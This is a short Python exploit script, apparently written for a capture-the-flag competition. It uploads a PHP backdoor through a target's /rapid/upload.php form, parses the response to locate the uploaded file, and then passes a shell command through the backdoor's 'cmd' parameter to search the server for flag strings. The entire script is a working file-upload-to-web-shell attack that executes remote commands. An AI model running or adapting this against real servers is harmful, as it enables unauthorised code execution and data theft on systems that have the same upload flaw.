from distutils.command.upload import upload
from urllib import response
import requests
import sys
import re
import random
from io import BytesIO

def random_str():
    return str(random.randint(100, 999999))

def print_flags(raw_data):
    print("\n".join(re.findall("FLG[0-9a-f]{28}", raw_data)))

def exploit(target):
    s = requests.Session()
    files = {'f': open('backdoor.php', 'rb')}
    upload_r = s.post("http://%s/rapid/upload.php" % target, files=files, data={'i': random_str()})
    path_to_backdoor = upload_r.text.split("<font color='green'>download link</font>:</td><td><a href='files/")[1].split("/</a></td>")[0].split("/'>")[1]
    r = s.get(path_to_backdoor + "/backdoor.php", params={'cmd': "cd /home/rapid && find -name '*.jpg' -exec strings {} \\; | grep 'FLG'"})

    print_flags(r.text)

if __name__ == '__main__':
    exploit(sys.argv[1])
